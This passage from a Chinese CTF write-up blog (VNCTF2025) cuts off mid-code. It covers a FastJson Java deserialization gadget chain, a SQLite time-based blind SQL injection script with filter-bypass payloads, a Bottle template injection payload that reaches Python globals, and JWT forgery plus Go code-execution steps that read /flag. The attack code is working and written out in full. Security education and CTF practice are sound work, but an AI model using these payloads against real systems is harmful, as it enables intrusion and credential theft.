string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">JSONArray</span> jsonArray1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        jsonArray1<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>signedObject<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">EventListenerList</span> eventListenerList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventListenerList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">UndoManager</span> undoManager <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UndoManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Vector</span> vector <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Vector</span><span class="token punctuation">)</span> <span class="token class-name">Utils</span><span class="token punctuation">.</span><span class="token function">getFieldValue</span><span class="token punctuation">(</span>undoManager<span class="token punctuation">,</span> <span class="token string">"edits"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        vector<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>jsonArray1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>eventListenerList<span class="token punctuation">,</span> <span class="token string">"listenerList"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">InternalError</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> undoManager<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span> hashMap2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashMap2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>vector<span class="token punctuation">,</span>eventListenerList<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>hashMap2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>UnSerialize</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> makeMap <span class="token punctuation">(</span><span class="token class-name">Object</span> v1<span class="token punctuation">,</span> <span class="token class-name">Object</span> v2 <span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"size"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> nodeC<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            nodeC <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.HashMap$Node"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span> <span class="token class-name">ClassNotFoundException</span> e <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            nodeC <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.HashMap$Entry"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> nodeCons <span class="token operator">=</span> nodeC<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> nodeC<span class="token punctuation">)</span><span class="token punctuation">;</span>        nodeCons<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> tbl <span class="token operator">=</span> <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>nodeC<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>tbl<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nodeCons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v1<span class="token punctuation">,</span> v1<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>tbl<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> nodeCons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v2<span class="token punctuation">,</span> v2<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"table"</span><span class="token punctuation">,</span> tbl<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> s<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload要发两次才能打进去，第一次会报<code>default constructor not found. class java.security.SignedObject</code></p><blockquote><p>当多次进行反序列化时，FastJson 会将上一次没有成功的类缓存起来，之后的反序列化就不会再次产生上面的错误，所以只需要多打一次即可：<a href="https://www.freebuf.com/articles/network/369855.html">https://www.freebuf.com/articles/network/369855.html</a></p></blockquote><p><img src="/blog/2025/02/08/VNCTF2025/image-20250221221950564.png" alt="image-20250221221950564"></p><hr><h2 id="奶龙回家（复现）"><a href="#奶龙回家（复现）" class="headerlink" title="奶龙回家（复现）"></a>奶龙回家（复现）</h2><blockquote><p>本题考点是注入攻击，无需进行字典爆破操作</p></blockquote><p>就一个登录，账密处测试闭合：<code>1&quot;</code>回显 “账号密码错误！！”，<code>1&#39;</code>回显 “发生了某种错误？？”</p><p>fuzz 发现 ban 了&#x3D;，sleep，空格，union</p><p>然后使用<code>1&#39;</code>闭合后跟<code>#</code>注释时返回 发生了某种错误？？，用<code>--</code>注释返回 账号密码错误！！</p><p>说明使用<code>--</code>才实现了注释，由此可猜测是 sqlite</p><p>注意 sqlite 里没有 sleep 和 if 函数，要测试盲注参考：<a href="https://www.freebuf.com/articles/network/324785.html">https://www.freebuf.com/articles/network/324785.html</a></p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">-1&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;(case&#x2F;**&#x2F;when(2&gt;1)&#x2F;**&#x2F;then&#x2F;**&#x2F;randomblob(300000000)&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end)--<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功延时</p><p>那么直接上脚本打：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'http://node.vnteam.cn:47261/login'</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    low <span class="token operator">=</span> <span class="token number">32</span>    high <span class="token operator">=</span> <span class="token number">128</span>    mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;</span> high<span class="token punctuation">)</span><span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>        payload <span class="token operator">=</span> <span class="token string">"-1'/**/or/**/(case/**/when(substr((select/**/hex(group_concat(name))/**/from/**/sqlite_master),&#123;0&#125;,1)>'&#123;1&#125;')/**/then/**/randomblob(100000000)/**/else/**/0/**/end)/*"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># payload = "-1'/**/or/**/(case/**/when(substr((select/**/hex(group_concat(username))/**/from/**/users),&#123;0&#125;,1)>'&#123;1&#125;')/**/then/**/randomblob(100000000)/**/else/**/0/**/end)/*".format(i, chr(mid))</span>        <span class="token comment"># payload = "-1'/**/or/**/(case/**/when(substr((select/**/hex(group_concat(password))/**/from/**/users),&#123;0&#125;,1)>'&#123;1&#125;')/**/then/**/randomblob(100000000)/**/else/**/0/**/end)/*".format(i, chr(mid))</span>        datas <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span>        <span class="token comment"># print(datas)</span>        start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>datas<span class="token punctuation">)</span>        end_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        spend_time <span class="token operator">=</span> end_time <span class="token operator">-</span> start_time        <span class="token keyword">if</span> spend_time <span class="token operator">>=</span> <span class="token number">0.4</span><span class="token punctuation">:</span>  <span class="token comment">#这里需要调一下。要先跑几次必会延迟的请求测试一下平均延时。</span>            low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            high <span class="token operator">=</span> mid        mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>mid <span class="token operator">==</span> <span class="token number">32</span> <span class="token keyword">or</span> mid <span class="token operator">==</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    flag <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span> <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>表 users,sqlite_sequence</p><p>账密 nailong:woaipangmao114514</p><p><img src="/blog/2025/02/08/VNCTF2025/image-20250212213420233.png" alt="image-20250212213420233"></p><p>访问得到flag</p><hr><h2 id="学生姓名登记系统（复现）"><a href="#学生姓名登记系统（复现）" class="headerlink" title="学生姓名登记系统（复现）"></a>学生姓名登记系统（复现）</h2><blockquote><p>Infernity师傅用某个单文件框架给他的老师写了一个“学生姓名登记系统”，并且对用户的输入做了严格的限制，他自认为他的系统无懈可击，但是真的无懈可击吗？</p></blockquote><p>ssti</p><p>每行长度不超过23</p><p>不解析 lipsum，config，url_for，每一行必须都能解析才能解析ssti，说明不是jinja</p><p>ban 了 eval，不让 import</p><br><p>题目描述专门强调用单文件框架，搜一下python单文件框架可以找到 Bottle 框架，手册：<a href="https://www.osgeo.cn/bottle/">https://www.osgeo.cn/bottle/</a></p><p>默认的模板渲染：<a href="https://www.osgeo.cn/bottle/stpl.html">https://www.osgeo.cn/bottle/stpl.html</a></p><p><img src="/blog/2025/02/08/VNCTF2025/image-20250212220137623.png" alt="image-20250212220137623"></p><p>用模板函数测试一下</p><p><img src="/blog/2025/02/08/VNCTF2025/image-20250212220259810.png" alt="image-20250212220259810"></p><p>验证成功</p><p>因为每行有限制长度，那么思路就是利用这个set实现拼接</p><p>但是另一个问题是这里光 <code>&#123;&#123;setdefault('','')&#125;&#125;</code> 就占了 21 个长度，我们不可能直接构造</p><br><p>注意到这里python版本是3.12</p><p><img src="/blog/2025/02/08/VNCTF2025/image-20250212221016428.png" alt="image-20250212221016428"></p><p>python3.8 后引入了海象运算符<code>:=</code>，此事在 pyjail 里亦有记载</p><p>于是构造payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>a<span class="token operator">:=</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>b<span class="token operator">:=</span>a<span class="token punctuation">.</span>__base__<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>c<span class="token operator">:=</span>b<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>d<span class="token operator">:=</span>c<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>e<span class="token operator">:=</span>d<span class="token punctuation">[</span><span class="token number">154</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>f<span class="token operator">:=</span>e<span class="token punctuation">.</span>__init__<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>g<span class="token operator">:=</span>f<span class="token punctuation">.</span>__globals__<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>环境变量里找到flag</p><p><img src="/blog/2025/02/08/VNCTF2025/image-20250212221623571.png" alt="image-20250212221623571"></p><hr><h2 id="Gin（复现）"><a href="#Gin（复现）" class="headerlink" title="Gin（复现）"></a>Gin（复现）</h2><p>后面时间全梭哈这题了</p><p>注册登录后有一个文件上传的接口</p><h3 id="jwt伪造"><a href="#jwt伪造" class="headerlink" title="jwt伪造"></a>jwt伪造</h3><p>上传后有一个文件下载的接口，可以目录穿越下载 ..&#x2F;config&#x2F;key.go</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> config<span class="token keyword">func</span> <span class="token function">Key</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token string">"r00t32l"</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">Year</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">int64</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token number">2025</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本地生成key</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"math/rand"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">GenerateKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>rand<span class="token punctuation">.</span><span class="token function">Seed</span><span class="token punctuation">(</span><span class="token number">2025</span><span class="token punctuation">)</span>randomNumber <span class="token operator">:=</span> rand<span class="token punctuation">.</span><span class="token function">Intn</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>key <span class="token operator">:=</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%03d%s"</span><span class="token punctuation">,</span> randomNumber<span class="token punctuation">,</span> <span class="token string">"r00t32l"</span><span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token keyword">return</span> key<span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">GenerateKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到key：<code>122r00t32l</code></p><p>然后伪造 jwt 的 username 为admin即可登录admin</p><p><img src="/blog/2025/02/08/VNCTF2025/image-20250208220615435.png" alt="image-20250208220615435"></p><h3 id="Goeval-RCE"><a href="#Goeval-RCE" class="headerlink" title="Goeval RCE"></a>Goeval RCE</h3><p>来到admin的代码执行</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">Eval</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>code <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">PostForm</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token keyword">if</span> code <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span>response<span class="token punctuation">.</span><span class="token function">Response</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> http<span class="token punctuation">.</span>StatusBadRequest<span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token string">"No code provided"</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">containsBannedPackages</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token function">containsBannedPackages</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>response<span class="token punctuation">.</span><span class="token function">Response</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> http<span class="token punctuation">.</span>StatusBadRequest<span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token string">"Code contains banned packages"</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>tmpFile<span class="token punctuation">,</span> err <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">TempFile</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"goeval-*.go"</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Error creating temp file:"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>response<span class="token punctuation">.</span><span class="token function">Response</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token string">"Error creating temporary file"</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token keyword">defer</span> os<span class="token punctuation">.</span><span class="token function">Remove</span><span class="token punctuation">(</span>tmpFile<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">=</span> tmpFile<span class="token punctuation">.</span><span class="token function">WriteString</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Error writing code to temp file:"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>response<span class="token punctuation">.</span><span class="token function">Response</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token string">"Error writing code to temp file"</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>cmd <span class="token operator">:=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"go"</span><span class="token punctuation">,</span> <span class="token string">"run"</span><span class="token punctuation">,</span> tmpFile<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>output<span class="token punctuation">,</span> err <span class="token operator">:=</span> cmd<span class="token punctuation">.</span><span class="token function">CombinedOutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Error running Go code:"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>response<span class="token punctuation">.</span><span class="token function">Response</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token function">string</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"Error executing code"</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>response<span class="token punctuation">.</span><span class="token function">Success</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token function">string</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">containsBannedPackages</span><span class="token punctuation">(</span>code <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>importRegex <span class="token operator">:=</span> <span class="token string">`(?i)import\s*\((?s:.*?)\)`</span>re <span class="token operator">:=</span> regexp<span class="token punctuation">.</span><span class="token function">MustCompile</span><span class="token punctuation">(</span>importRegex<span class="token punctuation">)</span>matches <span class="token operator">:=</span> re<span class="token punctuation">.</span><span class="token function">FindStringSubmatch</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>imports <span class="token operator">:=</span> matches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>imports<span class="token punctuation">)</span><span class="token keyword">if</span> strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>imports<span class="token punctuation">,</span> <span class="token string">"os/exec"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ban 了 os&#x2F;exec 依赖</p><p>尝试读文件：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"os"</span><span class="token string">"syscall"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>file<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Error opening file:"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token keyword">defer</span> file<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>buffer <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span>n<span class="token punctuation">,</span> err <span class="token operator">:=</span> syscall<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token function">int</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">Fd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span 